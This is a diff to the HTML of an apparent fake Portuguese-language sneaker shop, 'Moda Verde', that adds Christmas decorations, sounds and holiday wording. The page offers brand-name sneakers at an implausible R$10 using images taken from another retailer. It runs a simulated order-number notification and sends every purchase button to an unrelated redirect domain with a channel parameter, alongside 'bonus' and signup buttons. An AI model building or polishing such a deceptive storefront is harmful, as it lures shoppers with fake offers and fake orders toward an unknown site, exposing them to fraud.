@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Moda Verde - Promoção Exclusiva</title>
+    <title>Moda Verde - Promoção de Natal</title>
     
     <!-- Meta Tags -->
-    <meta name="description" content="Moda Verde - Loja online de tênis esportivos com até 80% OFF. Frete grátis e parcelamento em até 3x sem juros.">
-    <meta property="og:title" content="Moda Verde - Promoção Exclusiva">
-    <meta property="og:description" content="Tênis esportivos com até 80% OFF. Frete grátis para todo Brasil!">
+    <meta name="description" content="Moda Verde - Promoção Especial de Natal! Tênis esportivos com até 80% OFF. Frete grátis e parcelamento em até 3x sem juros.">
+    <meta property="og:title" content="Moda Verde - Promoção Especial de Natal">
+    <meta property="og:description" content="Tênis esportivos com até 80% OFF. Frete grátis para todo Brasil! Aproveite nossa promoção de Natal.">
     <meta property="og:image" content="https://iili.io/FMxs38b.png">
     <meta property="og:url" content="https://modaverde.com.br">
     <meta property="og:type" content="website">
@@ -48,20 +48,23 @@
             --light-green: #3cb371;
             --red: #ff6b6b;
             --dark-red: #d23369;
+            --christmas-red: #d62828;
+            --christmas-green: #2a9134;
+            --christmas-gold: #fcbf49;
         }
         
         body {
             font-family: 'Arial', sans-serif;
             margin: 0;
             padding: 0;
-            background: linear-gradient(135deg, #d4edda 0%, #f8f9fa 100%);
+            background: linear-gradient(135deg, #f0f8ff 0%, #fff5f5 100%);
             overflow-x: hidden;
             position: relative;
             min-height: 100vh;
         }
         
         /* Enhanced Snow & Gold Star Animations */
-        .snow, .gold-star {
+        .snow, .gold-star, .christmas-ball {
             position: absolute;
             border-radius: 50%;
             pointer-events: none;
@@ -80,9 +83,17 @@
         .gold-star {
             width: 12px;
             height: 12px;
-            background: radial-gradient(circle, var(--gold) 30%, var(--dark-gold) 100%);
+            background: radial-gradient(circle, var(--christmas-gold) 30%, var(--gold) 100%);
             animation: fall 10s linear infinite, twinkle 2s infinite alternate;
-            box-shadow: 0 0 10px var(--gold);
+            box-shadow: 0 0 10px var(--christmas-gold);
+        }
+        
+        .christmas-ball {
+            width: 10px;
+            height: 10px;
+            background: radial-gradient(circle, var(--christmas-red) 30%, #8b0000 100%);
+            animation: fall 8s linear infinite, swing 3s infinite alternate;
+            box-shadow: 0 0 8px var(--christmas-red);
         }
         
         @keyframes fall {
@@ -94,6 +105,64 @@
         @keyframes twinkle {
             0%, 100% { opacity: 0.8; }
             50% { opacity: 0.3; transform: scale(1.5); }
+        }
+        
+        @keyframes swing {
+            0%, 100% { transform: translateX(0); }
+            50% { transform: translateX(15px); }
+        }
+        
+        /* Christmas Tree */
+        .christmas-tree {
+            position: absolute;
+            width: 80px;
+            height: 120px;
+            z-index: 3;
+        }
+        
+        .christmas-tree::before {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 0;
+            border-left: 40px solid transparent;
+            border-right: 40px solid transparent;
+            border-bottom: 60px solid var(--christmas-green);
+            bottom: 0;
+        }
+        
+        .christmas-tree::after {
+            content: '';
+            position: absolute;
+            width: 0;
+            height: 0;
+            border-left: 30px solid transparent;
+            border-right: 30px solid transparent;
+            border-bottom: 50px solid var(--christmas-green);
+            bottom: 40px;
+            left: 10px;
+        }
+        
+        .tree-decoration {
+            position: absolute;
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: var(--christmas-red);
+            z-index: 4;
+        }
+        
+        .tree-star {
+            position: absolute;
+            width: 0;
+            height: 0;
+            border-left: 15px solid transparent;
+            border-right: 15px solid transparent;
+            border-bottom: 25px solid var(--christmas-gold);
+            top: -25px;
+            left: 25px;
+            transform: rotate(180deg);
+            z-index: 4;
         }
         
         /* Order Notification */
@@ -108,7 +177,8 @@
             z-index: 1000;
             display: none;
             animation: slideIn 0.5s forwards;
-            border-left: 5px solid var(--green);
+            border-left: 5px solid var(--christmas-red);
+            background: linear-gradient(135deg, #fff 0%, #fff9f9 100%);
         }
         
         @keyframes slideIn {
@@ -117,7 +187,7 @@
         }
         
         .order-number {
-            color: var(--green);
+            color: var(--christmas-red);
             font-weight: bold;
             font-size: 18px;
         }
@@ -129,19 +199,28 @@
         }
         
         .header {
-            background: linear-gradient(135deg, var(--green) 0%, var(--light-green) 100%);
+            background: linear-gradient(135deg, var(--christmas-green) 0%, var(--green) 100%);
             color: white;
             padding: 15px;
             text-align: center;
             position: relative;
             box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            border-bottom: 4px solid var(--christmas-red);
+        }
+        
+        .logo-container {
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 15px;
         }
         
         .logo {
             width: 100%;
             max-width: 300px;
-            margin-bottom: 15px;
             filter: drop-shadow(0 4px 6px rgba(0,0,0,0.1));
+            z-index: 3;
         }
         
         .nav-buttons {
@@ -153,8 +232,8 @@
         }
         
         .nav-btn {
-            background: linear-gradient(135deg, var(--gold) 0%, var(--dark-gold) 100%);
-            color: var(--green);
+            background: linear-gradient(135deg, var(--christmas-gold) 0%, var(--gold) 100%);
+            color: var(--christmas-red);
             border: none;
             padding: 12px 25px;
             border-radius: 30px;
@@ -205,6 +284,8 @@
             box-shadow: 0 4px 12px rgba(0,0,0,0.05);
             position: relative;
             overflow: hidden;
+            border: 2px solid var(--christmas-red);
+            background: linear-gradient(135deg, #fff 0%, #fff9f9 100%);
         }
         
         .product-image {
@@ -214,6 +295,7 @@
             box-shadow: 0 4px 12px rgba(0,0,0,0.1);
             margin-bottom: 15px;
             transition: transform 0.3s, box-shadow 0.3s;
+            border: 2px solid var(--christmas-green);
         }
         
         .product-image:hover {
@@ -225,11 +307,11 @@
             font-size: 20px;
             font-weight: bold;
             margin: 15px 0;
-            color: var(--green);
+            color: var(--christmas-green);
         }
         
         .product-price {
-            color: var(--dark-gold);
+            color: var(--christmas-red);
             font-size: 28px;
             font-weight: bold;
             margin: 10px 0;
@@ -245,7 +327,7 @@
         }
         
         .discount-badge {
-            background: linear-gradient(135deg, var(--red) 0%, var(--dark-red) 100%);
+            background: linear-gradient(135deg, var(--christmas-red) 0%, var(--red) 100%);
             color: white;
             padding: 4px 10px;
             border-radius: 20px;
@@ -257,8 +339,8 @@
         }
         
         .buy-btn {
-            background: linear-gradient(135deg, var(--gold) 0%, var(--dark-gold) 100%);
-            color: var(--green);
+            background: linear-gradient(135deg, var(--christmas-gold) 0%, var(--gold) 100%);
+            color: var(--christmas-red);
             border: none;
             padding: 15px 40px;
             border-radius: 30px;
@@ -312,6 +394,8 @@
             text-align: center;
             transition: transform 0.3s;
             position: relative;
+            border: 1px solid var(--christmas-green);
+            background: linear-gradient(135deg, #fff 0%, #f9fff9 100%);
         }
         
         .product-card:hover {
@@ -325,36 +409,59 @@
             height: 120px;
             object-fit: cover;
             margin-bottom: 10px;
+            border: 1px solid var(--christmas-red);
         }
         
         .product-card .product-title {
             font-size: 16px;
             margin: 5px 0;
+            color: var(--christmas-green);
+        }
+        
+        .add-to-cart-btn {
+            background: linear-gradient(135deg, var(--christmas-red) 0%, var(--red) 100%);
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+        
+        .add-to-cart-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
         }
         
         .footer {
-            background: linear-gradient(135deg, var(--green) 0%, var(--light-green) 100%);
+            background: linear-gradient(135deg, var(--christmas-green) 0%, var(--green) 100%);
             color: white;
             text-align: center;
             padding: 20px;
             margin-top: 40px;
             font-size: 14px;
             box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
+            border-top: 4px solid var(--christmas-red);
         }
         
         .shipping-info {
-            color: var(--green);
+            color: var(--christmas-green);
             font-weight: bold;
             margin: 10px 0;
             font-size: 16px;
         }
         
         .section-title {
-            color: var(--green);
+            color: var(--christmas-green);
             text-align: center;
             margin: 30px 0 20px;
             font-size: 24px;
             position: relative;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
         }
         
         .section-title::after {
@@ -362,7 +469,7 @@
             display: block;
             width: 80px;
             height: 3px;
-            background: linear-gradient(90deg, var(--gold), var(--dark-gold));
+            background: linear-gradient(90deg, var(--christmas-gold), var(--gold));
             margin: 10px auto;
             border-radius: 3px;
         }
@@ -384,6 +491,7 @@
             box-shadow: 0 4px 10px rgba(0,0,0,0.2);
             z-index: 100;
             animation: pulse 2s infinite;
+            text-decoration: none;
         }
         
         @keyframes pulse {
@@ -419,10 +527,12 @@
             border-radius: 15px;
             box-shadow: 0 4px 12px rgba(0,0,0,0.05);
             text-align: center;
+            border: 2px solid var(--christmas-green);
+            background: linear-gradient(135deg, #fff 0%, #f9fff9 100%);
         }
         
         .address-title {
-            color: var(--green);
+            color: var(--christmas-red);
             font-size: 20px;
             margin-bottom: 10px;
         }
@@ -431,11 +541,82 @@
             color: #555;
             line-height: 1.6;
         }
+        
+        /* Christmas Ribbon */
+        .christmas-ribbon {
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 150px;
+            height: 150px;
+            overflow: hidden;
+            z-index: 10;
+        }
+        
+        .christmas-ribbon::before,
+        .christmas-ribbon::after {
+            content: '';
+            position: absolute;
+            z-index: -1;
+            display: block;
+            border: 5px solid var(--christmas-gold);
+            border-top-color: transparent;
+            border-right-color: transparent;
+        }
+        
+        .christmas-ribbon::before {
+            top: 0;
+            left: 0;
+        }
+        
+        .christmas-ribbon::after {
+            bottom: 0;
+            right: 0;
+        }
+        
+        .christmas-ribbon span {
+            position: absolute;
+            display: block;
+            width: 225px;
+            padding: 15px 0;
+            background-color: var(--christmas-red);
+            box-shadow: 0 5px 10px rgba(0,0,0,.1);
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            text-shadow: 0 1px 1px rgba(0,0,0,.2);
+            text-transform: uppercase;
+            text-align: center;
+            right: -25px;
+            top: 30px;
+            transform: rotate(45deg);
+        }
+        
+        /* Garland */
+        .garland {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 36px;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 40 40"><circle cx="20" cy="20" r="5" fill="%23d62828"/><circle cx="35" cy="20" r="5" fill="%232a9134"/><circle cx="5" cy="20" r="5" fill="%23fcbf49"/></svg>');
+            background-size: 40px 40px;
+            z-index: 10;
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
     <!-- Animated Background Elements -->
     <div id="background-elements"></div>
+    
+    <!-- Christmas Garland -->
+    <div class="garland"></div>
+    
+    <!-- Christmas Ribbon -->
+    <div class="christmas-ribbon">
+        <span>Promoção de Natal</span>
+    </div>
     
     <!-- Order Notification -->
     <div class="order-notification" id="orderNotification">
@@ -444,23 +625,33 @@
     </div>
     
     <!-- WhatsApp Button -->
-    <a href="https://wa.me/?text=Confira%20esta%20promoção%20exclusiva%20da%20Moda%20Verde!" class="whatsapp-btn" id="whatsappBtn">
+    <a href="https://wa.me/?text=Confira%20esta%20promoção%20exclusiva%20de%20Natal%20da%20Moda%20Verde!" class="whatsapp-btn" id="whatsappBtn">
         <i>📱</i>
     </a>
     
     <div class="content">
         <div class="header">
-            <img src="https://iili.io/FMxs38b.png" alt="Moda Verde" class="logo">
+            <div class="logo-container">
+                <div class="christmas-tree" id="treeLeft">
+                    <div class="tree-star"></div>
+                    <!-- Decorations will be added via JS -->
+                </div>
+                <img src="https://iili.io/FMxs38b.png" alt="Moda Verde" class="logo">
+                <div class="christmas-tree" id="treeRight">
+                    <div class="tree-star"></div>
+                    <!-- Decorations will be added via JS -->
+                </div>
+            </div>
             <div class="nav-buttons">
                 <button class="nav-btn" id="loginBtn">LOGIN</button>
                 <button class="nav-btn" id="registerBtn">CADASTRE-SE</button>
-                <button class="nav-btn" id="bonusBtn">BÔNUS AGORA!</button>
+                <button class="nav-btn" id="bonusBtn">BÔNUS NATAL!</button>
             </div>
         </div>
         
         <div class="product-container">
             <img src="https://static.netshoes.com.br/produtos/chuteira-campo-puma-rapido-iii-unissex/72/PI3-7165-172/PI3-7165-172_zoom1.jpg?ts=1748873835&ims=326x" alt="Chuteiras de futebol" class="product-image">
-            <div class="product-title">Tênis Esportivo Premium</div>
+            <div class="product-title">Tênis Esportivo Premium - Edição Natal</div>
             <div>
                 <span class="product-price">R$10</span>
                 <span class="product-old-price">R$50</span>
@@ -470,24 +661,25 @@
             <button class="buy-btn" id="buyNowBtn">COMPRAR AGORA</button>
             
             <div style="margin-top: 30px; text-align: left;">
-                <h3 style="color: var(--green); border-bottom: 2px solid var(--gold); padding-bottom: 5px;">Descrição do Produto:</h3>
-                <p>• Tênis esportivo de alta qualidade</p>
+                <h3 style="color: var(--christmas-green); border-bottom: 2px solid var(--christmas-red); padding-bottom: 5px;">Descrição do Produto:</h3>
+                <p>• Tênis esportivo de alta qualidade - Edição Especial de Natal</p>
                 <p>• Material respirável e confortável</p>
                 <p>• Solado antiderrapante</p>
                 <p>• Disponível em vários tamanhos</p>
+                <p>• Presente perfeito para o Natal!</p>
             </div>
         </div>
         
-        <h2 class="section-title">OUTROS PRODUTOS EM PROMOÇÃO</h2>
+        <h2 class="section-title">OFERTAS ESPECIAIS DE NATAL</h2>
         <div class="product-grid">
             <!-- Product 1 -->
             <div class="product-card">
                 <img src="https://static.netshoes.com.br/produtos/chuteira-campo-adidas-f50-league-ll-unissex/98/FBA-7723-198/FBA-7723-198_zoom1.jpg?ts=1751385231&ims=326x" alt="Tênis Adidas">
-                <div class="product-title">Adidas</div>
+                <div class="product-title">Adidas Natal</div>
                 <div>
-                    <span style="color: var(--dark-gold); font-weight: bold;">R$10</span>
+                    <span style="color: var(--christmas-red); font-weight: bold;">R$10</span>
                     <span style="text-decoration: line-through; color: #888; font-size: 12px;">R$50</span>
-                    <span style="background: linear-gradient(135deg, var(--red) 0%, var(--dark-red) 100%); color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold;">80% OFF</span>
+                    <span style="background: linear-gradient(135deg, var(--christmas-red) 0%, var(--red) 100%); color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold;">80% OFF</span>
                 </div>
                 <button class="add-to-cart-btn" data-product="Adidas">COMPRAR</button>
             </div>
@@ -495,11 +687,11 @@
             <!-- Product 2 -->
             <div class="product-card">
                 <img src="https://static.netshoes.com.br/produtos/chuteira-nike-beco-2-society/28/SGL-036R-028/SGL-036R-028_zoom1.jpg?ts=1748860421&ims=326x" alt="Tênis Nike">
-                <div class="product-title">Nike</div>
+                <div class="product-title">Nike Natal</div>
                 <div>
-                    <span style="color: var(--dark-gold); font-weight: bold;">R$10</span>
+                    <span style="color: var(--christmas-red); font-weight: bold;">R$10</span>
                     <span style="text-decoration: line-through; color: #888; font-size: 12px;">R$50</span>
-                    <span style="background: linear-gradient(135deg, var(--red) 0%, var(--dark-red) 100%); color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold;">80% OFF</span>
+                    <span style="background: linear-gradient(135deg, var(--christmas-red) 0%, var(--red) 100%); color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold;">80% OFF</span>
                 </div>
                 <button class="add-to-cart-btn" data-product="Nike">COMPRAR</button>
             </div>
@@ -507,11 +699,11 @@
             <!-- Product 3 -->
             <div class="product-card">
                 <img src="https://static.netshoes.com.br/produtos/tenis-olympikus-corre-4/42/2I3-0603-542/2I3-0603-542_zoom1.jpg?ts=1741775013&ims=326x" alt="Tênis Olympikus">
-                <div class="product-title">Olympikus</div>
+                <div class="product-title">Olympikus Natal</div>
                 <div>
-                    <span style="color: var(--dark-gold); font-weight: bold;">R$10</span>
+                    <span style="color: var(--christmas-red); font-weight: bold;">R$10</span>
                     <span style="text-decoration: line-through; color: #888; font-size: 12px;">R$50</span>
-                    <span style="background: linear-gradient(135deg, var(--red) 0%, var(--dark-red) 100%); color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold;">80% OFF</span>
+                    <span style="background: linear-gradient(135deg, var(--christmas-red) 0%, var(--red) 100%); color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold;">80% OFF</span>
                 </div>
                 <button class="add-to-cart-btn" data-product="Olympikus">COMPRAR</button>
             </div>
@@ -519,11 +711,11 @@
             <!-- Product 4 -->
             <div class="product-card">
                 <img src="https://static.netshoes.com.br/produtos/tenis-de-corrida-feminino-mizuno-wave-frontier-15/98/2FV-0555-198/2FV-0555-198_zoom1.jpg?ts=1722270368&ims=326x" alt="Tênis Mizuno">
-                <div class="product-title">Mizuno</div>
+                <div class="product-title">Mizuno Natal</div>
                 <div>
-                    <span style="color: var(--dark-gold); font-weight: bold;">R$10</span>
+                    <span style="color: var(--christmas-red); font-weight: bold;">R$10</span>
                     <span style="text-decoration: line-through; color: #888; font-size: 12px;">R$50</span>
-                    <span style="background: linear-gradient(135deg, var(--red) 0%, var(--dark-red) 100%); color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold;">80% OFF</span>
+                    <span style="background: linear-gradient(135deg, var(--christmas-red) 0%, var(--red) 100%); color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold;">80% OFF</span>
                 </div>
                 <button class="add-to-cart-btn" data-product="Mizuno">COMPRAR</button>
             </div>
@@ -531,11 +723,11 @@
             <!-- Product 5 -->
             <div class="product-card">
                 <img src="https://static.netshoes.com.br/produtos/tenis-asics-dynablast-5-feminino/18/2FW-2952-818/2FW-2952-818_zoom1.jpg?ts=1739874812&ims=326x" alt="Tênis Asics">
-                <div class="product-title">Asics</div>
+                <div class="product-title">Asics Natal</div>
                 <div>
-                    <span style="color: var(--dark-gold); font-weight: bold;">R$10</span>
+                    <span style="color: var(--christmas-red); font-weight: bold;">R$10</span>
                     <span style="text-decoration: line-through; color: #888; font-size: 12px;">R$50</span>
-                    <span style="background: linear-gradient(135deg, var(--red) 0%, var(--dark-red) 100%); color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold;">80% OFF</span>
+                    <span style="background: linear-gradient(135deg, var(--christmas-red) 0%, var(--red) 100%); color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold;">80% OFF</span>
                 </div>
                 <button class="add-to-cart-btn" data-product="Asics">COMPRAR</button>
             </div>
@@ -543,11 +735,11 @@
             <!-- Product 6 -->
             <div class="product-card">
                 <img src="https://static.netshoes.com.br/produtos/tenis-infantil-puma-caven-20-p/93/2I3-9897-793/2I3-9897-793_zoom1.jpg?ts=1743699501&ims=326x" alt="Tênis Puma">
-                <div class="product-title">Puma</div>
+                <div class="product-title">Puma Natal</div>
                 <div>
-                    <span style="color: var(--dark-gold); font-weight: bold;">R$10</span>
+                    <span style="color: var(--christmas-red); font-weight: bold;">R$10</span>
                     <span style="text-decoration: line-through; color: #888; font-size: 12px;">R$50</span>
-                    <span style="background: linear-gradient(135deg, var(--red) 0%, var(--dark-red) 100%); color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold;">80% OFF</span>
+                    <span style="background: linear-gradient(135deg, var(--christmas-red) 0%, var(--red) 100%); color: white; padding: 2px 8px; border-radius: 10px; font-size: 11px; font-weight: bold;">80% OFF</span>
                 </div>
                 <button class="add-to-cart-btn" data-product="Puma">COMPRAR</button>
             </div>
@@ -560,23 +752,24 @@
                 Rua José Bernardo Pinto, 333 - Vila Guilherme<br>
                 São Paulo - SP, 02055-000<br>
                 Brazil<br>
-                Telefone: (11) 1234-5678
+                Telefone: (11) 1234-5678<br>
+                <strong>Horário Especial de Natal:</strong> Aberto até as 22h
             </p>
         </div>
         
         <div class="footer">
-            © 2014-2025 Moda Verde - Todos os direitos reservados
+            © 2014-2025 Moda Verde - Feliz Natal e Próspero Ano Novo!
         </div>
     </div>
     
     <script>
-        // Enhanced Background Elements
+        // Enhanced Background Elements with Christmas balls
         function createBackground() {
             const container = document.getElementById('background-elements');
             const width = window.innerWidth;
             const height = window.innerHeight;
             
-            // Create more snowflakes (200 instead of 50)
+            // Create snowflakes
             for (let i = 0; i < 200; i++) {
                 const snow = document.createElement('div');
                 snow.classList.add('snow');
@@ -589,7 +782,7 @@
                 container.appendChild(snow);
             }
             
-            // Create gold stars (50 elements)
+            // Create gold stars
             for (let i = 0; i < 50; i++) {
                 const star = document.createElement('div');
                 star.classList.add('gold-star');
@@ -601,6 +794,62 @@
                 star.style.height = star.style.width;
                 container.appendChild(star);
             }
+            
+            // Create Christmas balls
+            for (let i = 0; i < 30; i++) {
+                const ball = document.createElement('div');
+                ball.classList.add('christmas-ball');
+                ball.style.left = Math.random() * width + 'px';
+                ball.style.top = -20 + 'px';
+                ball.style.animationDuration = 7 + Math.random() * 15 + 's';
+                ball.style.animationDelay = Math.random() * 5 + 's';
+                ball.style.width = 8 + Math.random() * 10 + 'px';
+                ball.style.height = ball.style.width;
+                
+                // Random color (red or gold)
+                if (Math.random() > 0.5) {
+                    ball.style.background = 'radial-gradient(circle, var(--christmas-gold) 30%, var(--gold) 100%)';
+                    ball.style.boxShadow = '0 0 8px var(--christmas-gold)';
+                }
+                
+                container.appendChild(ball);
+            }
+        }
+        
+        // Create Christmas trees with decorations
+        function createChristmasTrees() {
+            const treeLeft = document.getElementById('treeLeft');
+            const treeRight = document.getElementById('treeRight');
+            
+            // Add decorations to left tree
+            for (let i = 0; i < 10; i++) {
+                const decoration = document.createElement('div');
+                decoration.classList.add('tree-decoration');
+                
+                // Position decorations randomly on the tree
+                decoration.style.left = (10 + Math.random() * 60) + 'px';
+                decoration.style.top = (20 + Math.random() * 80) + 'px';
+                
+                // Random color (red or gold)
+                decoration.style.background = Math.random() > 0.5 ? 'var(--christmas-red)' : 'var(--christmas-gold)';
+                
+                treeLeft.appendChild(decoration);
+            }
+            
+            // Add decorations to right tree
+            for (let i = 0; i < 10; i++) {
+                const decoration = document.createElement('div');
+                decoration.classList.add('tree-decoration');
+                
+                // Position decorations randomly on the tree
+                decoration.style.left = (10 + Math.random() * 60) + 'px';
+                decoration.style.top = (20 + Math.random() * 80) + 'px';
+                
+                // Random color (red or gold)
+                decoration.style.background = Math.random() > 0.5 ? 'var(--christmas-red)' : 'var(--christmas-gold)';
+                
+                treeRight.appendChild(decoration);
+            }
         }
         
         // Click Animation
@@ -609,6 +858,11 @@
             clickEffect.classList.add('click-effect');
             clickEffect.style.left = e.clientX - 10 + 'px';
             clickEffect.style.top = e.clientY - 10 + 'px';
+            
+            // Christmas-themed colors
+            const colors = ['var(--christmas-red)', 'var(--christmas-green)', 'var(--christmas-gold)'];
+            clickEffect.style.background = colors[Math.floor(Math.random() * colors.length)];
+            
             document.body.appendChild(clickEffect);
             
             // Remove after animation
@@ -619,7 +873,7 @@
         
         // Order API Simulation
         function generateOrderNumber() {
-            const prefix = 'MV';
+            const prefix = 'MV-NATAL';
             const timestamp = Date.now().toString().slice(-6);
             const randomNum = Math.floor(1000 + Math.random() * 9000);
             return `${prefix}${timestamp}${randomNum}`;
@@ -684,8 +938,24 @@
                 showOrderNotification(productName);
             }
             
+            // Play Christmas sound
+            playChristmasSound();
+            
             // Redirect to the specified URL
             window.location.href = 'https://r53ra21.com?ch=37676';
+        }
+        
+        // Play Christmas sound
+        function playChristmasSound() {
+            const sounds = [
+                'https://www.soundjay.com/holiday/sounds/jingle-bells-01.mp3',
+                'https://www.soundjay.com/holiday/sounds/jingle-bells-02.mp3',
+                'https://www.soundjay.com/holiday/sounds/sleigh-bells-01.mp3'
+            ];
+            
+            const sound = new Audio(sounds[Math.floor(Math.random() * sounds.length)]);
+            sound.volume = 0.3;
+            sound.play().catch(e => console.log('Autoplay prevented:', e));
         }
         
         // Add event listeners to all buttons
@@ -695,8 +965,17 @@
             }
         });
         
-        // Initialize background on load
-        window.addEventListener('load', createBackground);
+        // Initialize on load
+        window.addEventListener('load', function() {
+            createBackground();
+            createChristmasTrees();
+            
+            // Add Christmas greeting
+            setTimeout(() => {
+                console.log('%cFeliz Natal e um Próspero Ano Novo! 🎄🎁', 
+                    'color: #d62828; font-size: 16px; font-weight: bold;');
+            }, 1000);
+        });
     </script>
 </body>
 </html>
